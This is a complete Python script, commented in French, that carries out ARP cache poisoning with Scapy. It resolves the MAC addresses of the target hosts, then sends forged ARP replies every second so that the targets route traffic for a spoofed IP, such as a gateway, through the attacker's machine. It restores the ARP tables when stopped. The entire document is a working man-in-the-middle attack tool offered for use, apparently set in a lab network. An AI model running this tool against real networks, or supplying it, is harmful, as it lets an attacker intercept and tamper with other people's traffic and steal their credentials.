#!/usr/bin/env python3
# Usage: python3 arp_spoof.py <target_ip1,target_ip2,...> <spoof_ip> <iface>
# Exemple: python3 arp_spoof.py 10.0.2.10,10.0.2.11 10.0.2.1 att-eth0

import sys
import time
from scapy.all import ARP, Ether, send, srp, conf

def get_mac(ip, iface=None, timeout=2):
    """Résout la MAC d'une IP par ARP request."""
    conf.iface = iface or conf.iface
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=timeout, verbose=False)
    for _, r in ans:
        return r[Ether].src
    return None

def spoof(target_ip, target_mac, spoof_ip, attacker_mac, iface):
    # envoyer un ARP reply : psrc=spoof_ip, hwsrc=attacker_mac
    arp_reply = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(arp_reply, iface=iface, verbose=False)

def restore(target_ip, target_mac, real_ip, real_mac, iface):
    # Restaurer en envoyant la vraie paire IP->MAC
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    send(arp, iface=iface, count=5, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 arp_spoof.py <targets_comma> <spoof_ip> <iface>")
        sys.exit(1)

    targets = sys.argv[1].split(",")
    spoof_ip = sys.argv[2]
    iface = sys.argv[3]

    # Obtenir MAC attaquant et MAC cible(s)
    attacker_mac = conf.iface = iface or conf.iface
    # scapy conf.iface is string; get hardware mac of interface
    import netifaces
    attacker_mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']

    print("[*] Interface:", iface, "Attacker MAC:", attacker_mac)
    target_macs = {}
    for t in targets:
        mac = get_mac(t, iface=iface)
        if mac:
            target_macs[t] = mac
            print("[*] Résolu", t, "->", mac)
        else:
            print("[!] Impossible de résoudre", t)
            sys.exit(1)

    print("[*] Démarrage de l'empoisonnement ARP. CTRL+C pour stopper.")
    try:
        while True:
            for t_ip, t_mac in target_macs.items():
                # dire au target que spoof_ip est à l'attaquant
                spoof(t_ip, t_mac, spoof_ip, attacker_mac, iface)
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n[*] Restauration des tables ARP...")
        # Si spoof_ip est la gateway, on restaure en envoyant la vraie info.
        # On essaye d'obtenir la vraie MAC de spoof_ip (elle est normalement sur le sous-réseau)
        real_mac = get_mac(spoof_ip, iface=iface)
        if real_mac:
            for t_ip, t_mac in target_macs.items():
                restore(t_ip, t_mac, spoof_ip, real_mac, iface)
        print("[*] Terminé.")
